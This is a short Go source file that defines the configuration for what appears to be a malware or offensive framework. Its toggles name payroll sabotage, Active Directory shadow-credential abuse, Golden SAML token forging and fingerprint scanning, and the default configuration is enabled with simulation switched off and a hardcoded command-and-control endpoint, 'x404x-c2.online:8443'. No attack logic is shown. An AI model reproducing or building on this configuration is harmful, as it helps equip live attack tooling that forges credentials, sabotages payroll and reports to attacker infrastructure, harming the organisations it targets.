package v30

type V30Config struct {
	Enabled         bool   `json:"enabled"`
	Simulation      bool   `json:"simulation"`
	PayrollSabotage bool   `json:"payroll_sabotage"`
	ADShadowCreds   bool   `json:"ad_shadow_creds"`
	GoldenSAML      bool   `json:"golden_saml"`
	PluginSystem    bool   `json:"plugin_system"`
	SPIFFEmTLS      bool   `json:"spiffe_mtls"`
	FingerprintScan bool   `json:"fingerprint_scan"`
	C2Endpoint      string `json:"c2_endpoint"`
}

func DefaultV30Config() *V30Config {
	return &V30Config{Enabled: true, Simulation: false, C2Endpoint: "x404x-c2.online:8443"}
}
